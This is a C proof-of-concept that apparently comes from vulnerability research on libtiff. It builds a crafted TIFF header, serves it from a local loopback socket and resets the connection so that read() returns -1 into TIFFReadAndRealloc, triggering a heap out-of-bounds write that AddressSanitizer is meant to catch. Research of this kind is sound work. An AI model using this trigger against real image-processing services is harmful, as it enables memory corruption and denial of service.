/*
 * natural_trigger_local_tcp.c
 * CVE Research: TIFFReadAndRealloc negative-read heap OOB write
 *
 * LOCAL PROOF — no VPS needed:
 * - Starts a TCP server on 127.0.0.1:random-port in a background thread
 * - Server writes 200-byte TIFF header (valid IFD + padding up to strip offset)
 * - Server waits 300ms then closes with SO_LINGER=0 -> RST
 * - Main thread connects and opens TIFF via TIFFClientOpen with raw read() callback
 * - Forward seek from 122->200 reads the 78 padding bytes (already in buffer)
 * - Next read() for strip data blocks -> RST fires -> read() returns -1 (ECONNRESET)
 * - TIFFReadAndRealloc receives -1 -> heap OOB write (detected by ASAN)
 *
 * This is a natural trigger: no LD_PRELOAD, no injection.
 * The readproc uses raw read() exactly as libvips openin_source_read() does.
 *
 * Compile + run:
 *   BUILD=/mnt/c/Users/Aleens/Documents/CYBER-NPS/CVE/libtiff_origin_master_temuan2_check_build_asan/libtiff
 *   gcc -g -O0 -fsanitize=address,undefined -pthread natural_trigger_local_tcp.c \
 *       -o natural_trigger_local -I/usr/include/x86_64-linux-gnu \
 *       -L$BUILD -ltiff -Wl,-rpath,$BUILD
 *   ASAN_OPTIONS=detect_leaks=0 LD_LIBRARY_PATH=$BUILD ./natural_trigger_local
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
/* sys/linger.h not needed — struct linger is in sys/socket.h */
#include <tiffio.h>

/* ------------------------------------------------------------------ */
/* TIFF header builder: strip at offset 200 (just past IFD area)      */
/* ------------------------------------------------------------------ */
#define STRIP_OFFSET  200
#define HEADER_SIZE   STRIP_OFFSET

static void build_tiff_header(uint8_t *buf)
{
    memset(buf, 0, HEADER_SIZE);

    /* Little-endian TIFF header */
    buf[0] = buf[1] = 'I';
    uint16_t magic = 42;
    memcpy(buf + 2, &magic, 2);
    uint32_t ifd_off = 8;
    memcpy(buf + 4, &ifd_off, 4);

    /* IFD: 9 entries */
    uint16_t ndir = 9;
    memcpy(buf + 8, &ndir, 2);

    typedef struct { uint16_t tag, type; uint32_t count, val; } E;
    E entries[] = {
        {256, 4, 1, 1},              /* ImageWidth        = 1      */
        {257, 4, 1, 1},              /* ImageLength       = 1      */
        {258, 3, 1, 8},              /* BitsPerSample     = 8      */
        {259, 3, 1, 32773},          /* Compression       = PackBits */
        {262, 3, 1, 1},              /* PhotometricInterp = BlackIsZero */
        {273, 4, 1, STRIP_OFFSET},   /* StripOffsets      = 200    */
        {277, 3, 1, 1},              /* SamplesPerPixel   = 1      */
        {278, 4, 1, 1},              /* RowsPerStrip      = 1      */
        {279, 4, 1, 2},              /* StripByteCounts   = 2      */
    };
    uint8_t *ifd = buf + 10;
    for (int i = 0; i < 9; i++)
        memcpy(ifd + i * 12, &entries[i], 12);
    /* Next IFD offset = 0 (already zeroed) */
}

/* ------------------------------------------------------------------ */
/* Background server thread: write TIFF header, wait, then RST        */
/* ------------------------------------------------------------------ */
typedef struct { int port; } SrvArgs;

static void *server_thread(void *arg)
{
    SrvArgs *sa = (SrvArgs *)arg;

    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int yes = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port        = htons((uint16_t)sa->port);

    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("[srv] bind"); return NULL;
    }
    listen(srv, 1);
    fprintf(stderr, "[srv] Listening on 127.0.0.1:%d\n", sa->port);

    int conn = accept(srv, NULL, NULL);
    close(srv);
    fprintf(stderr, "[srv] Client connected\n");

    /* Send TIFF header (IFD area, 200 bytes) */
    uint8_t hdr[HEADER_SIZE];
    build_tiff_header(hdr);
    ssize_t sent = send(conn, hdr, sizeof(hdr), 0);
    fprintf(stderr, "[srv] Sent %zd bytes of TIFF header (strip at offset %d)\n",
            sent, STRIP_OFFSET);

    /* Wait for client to parse IFD and start reading strip data */
    fprintf(stderr, "[srv] Waiting 300ms before RST...\n");
    usleep(300000);

    /* Send RST — read() on client side will return -1 (ECONNRESET) */
    struct linger l = {1, 0};
    setsockopt(conn, SOL_SOCKET, SO_LINGER, &l, sizeof(l));
    close(conn);
    fprintf(stderr, "[srv] RST sent — client read() will return -1\n");
    return NULL;
}

/* ------------------------------------------------------------------ */
/* TIFFClientOpen callbacks using raw read() syscall                  */
/* ------------------------------------------------------------------ */
typedef struct { int fd; off_t pos; } SockCtx;

static tmsize_t cb_read(thandle_t h, void *buf, tmsize_t size)
{
    SockCtx *ctx = (SockCtx *)h;
    ssize_t  n   = read(ctx->fd, buf, (size_t)size);
    fprintf(stderr, "[read] pos=%-6lld req=%-6lld got=%lld%s\n",
            (long long)ctx->pos, (long long)size, (long long)n,
            n < 0 ? " (ECONNRESET -> -1 returned to libtiff!)" : "");
    if (n > 0) ctx->pos += n;
    return (tmsize_t)n;   /* -1 on ECONNRESET, passed directly to TIFFReadAndRealloc */
}

static tmsize_t cb_write(thandle_t h, void *b, tmsize_t s) { (void)h; (void)b; return s; }

static toff_t cb_seek(thandle_t h, toff_t off, int whence)
{
    SockCtx *ctx = (SockCtx *)h;
    toff_t target;
    switch (whence) {
        case SEEK_SET: target = off; break;
        case SEEK_CUR: target = (toff_t)ctx->pos + off; break;
        default: return (toff_t)-1;
    }
    if (target == (toff_t)ctx->pos) return target;
    if (target < (toff_t)ctx->pos) {
        fprintf(stderr, "[seek] BACKWARD %lld->%lld: denied (stream)\n",
                (long long)ctx->pos, (long long)target);
        return (toff_t)-1;
    }
    /* Forward seek: read and discard (these bytes are IFD padding, already in buffer) */
    toff_t skip = target - (toff_t)ctx->pos;
    fprintf(stderr, "[seek] fwd %lld->%lld (discarding %lld pad bytes)\n",
            (long long)ctx->pos, (long long)target, (long long)skip);
    char discard[512];
    while (skip > 0) {
        size_t  chunk = skip < sizeof(discard) ? (size_t)skip : sizeof(discard);
        ssize_t n     = read(ctx->fd, discard, chunk);
        if (n <= 0) {
            fprintf(stderr, "[seek] discard read failed: n=%lld errno=%d\n",
                    (long long)n, errno);
            return (toff_t)-1;
        }
        ctx->pos += n;
        skip     -= n;
    }
    return (toff_t)ctx->pos;
}

static int    cb_close(thandle_t h) { SockCtx *c = (SockCtx *)h; close(c->fd); free(c); return 0; }
static toff_t cb_size(thandle_t h)  { (void)h; return (toff_t)-1; }
static int    cb_map(thandle_t h, void **p, toff_t *s) { (void)h; (void)p; (void)s; return 0; }
static void   cb_unmap(thandle_t h, void *p, toff_t s) { (void)h; (void)p; (void)s; }

/* ------------------------------------------------------------------ */
int main(void)
{
    fprintf(stderr,
        "=== Natural Trigger Local TCP Test (no LD_PRELOAD) ===\n"
        "TIFF strip at offset %d (just past IFD)\n"
        "readproc: raw read() syscall\n"
        "Expected: read() returns -1 on RST -> TIFFReadAndRealloc OOB write\n\n",
        STRIP_OFFSET);

    /* Pick a random port */
    int port = 14759;

    /* Start server thread */
    SrvArgs sa = {port};
    pthread_t tid;
    pthread_create(&tid, NULL, server_thread, &sa);
    usleep(50000);  /* 50ms: let server bind+listen */

    /* Connect to server */
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port        = htons((uint16_t)port);
    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect"); return 1;
    }
    fprintf(stderr, "[client] Connected to local server\n\n");

    /* Open TIFF via TIFFClientOpen with raw read() callback */
    SockCtx *ctx = calloc(1, sizeof(SockCtx));
    ctx->fd = fd; ctx->pos = 0;

    TIFF *tif = TIFFClientOpen(
        "local_stream", "r", (thandle_t)ctx,
        cb_read, cb_write, cb_seek, cb_close, cb_size, cb_map, cb_unmap);

    if (!tif) { fprintf(stderr, "[!] TIFFClientOpen failed\n"); return 1; }

    uint32_t w = 0, h = 0;
    TIFFGetField(tif, TIFFTAG_IMAGEWIDTH, &w);
    TIFFGetField(tif, TIFFTAG_IMAGELENGTH, &h);
    fprintf(stderr, "\n[tiff] Image: %ux%u\n", w, h);

    tsize_t  strip_size = TIFFStripSize(tif);
    fprintf(stderr, "[tiff] Strip size: %lld bytes\n", (long long)strip_size);
    fprintf(stderr, "[tiff] Calling TIFFReadEncodedStrip(0) ...\n\n");

    tdata_t  rbuf   = _TIFFmalloc(strip_size > 0 ? strip_size : 4096);
    tsize_t  result = TIFFReadEncodedStrip(tif, 0, rbuf, strip_size);

    fprintf(stderr, "\n[result] TIFFReadEncodedStrip returned: %lld\n", (long long)result);
    if (result < 0)
        fprintf(stderr,
            "[!!!] NEGATIVE RETURN — read() -1 propagated into TIFFReadAndRealloc\n"
            "      If ASAN output appeared above: heap-buffer-overflow CONFIRMED\n");
    else if (result == 0)
        fprintf(stderr, "[---] 0 returned — libtiff handled gracefully (no trigger)\n");
    else
        fprintf(stderr, "[---] %lld bytes read — success (no trigger)\n", (long long)result);

    _TIFFfree(rbuf);
    TIFFClose(tif);
    pthread_join(tid, NULL);

    fprintf(stderr, "\n[done] If no ASAN output: check ASAN libtiff linkage.\n");
    return 0;
}
